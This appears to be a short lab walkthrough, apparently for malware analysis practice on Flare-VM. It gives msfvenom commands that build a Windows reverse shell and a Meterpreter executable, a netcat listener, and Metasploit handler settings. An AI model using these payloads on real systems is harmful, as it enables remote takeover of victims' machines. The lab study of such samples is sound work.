## Reverse Shell Generation 

Here, we are usinig it to generate a **Windows-Based Reverse Shell** : 



>
>	msfvenom -p windows/shell_reverse_tcp -f exe > malicious.exe


Next, on a Kali Linux VM, we set up the **Listener** : 


>
>	nc -lnvp 1234



Next, we take our *malicious.exe* file unto the **Flare-VM** : 

>In multiple ways, such as the VMWARE *Shared Folders* feature! 
>
>or , for bonus points :
>
>python3 -m http.server 8080



## Using a Meterpreter Reverse Shell as an *.exe* File 


First, we use our trusty **MSFVENOM** to generate the the *Meterpreter Listener* : 

>
>	msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.126.141 LPORT=5678 -f exe > meterpreter.exe


Next, let us set up the *Listener* via **Metasploit** : 

>1. Use *Multi/Handler*
>2. Set the **LPORT**
>3. Set the **LHOST**
>4. Set the payload *windows/meterpreter_reverse_tcp*


We now take the file unto our **Flare-VM**!
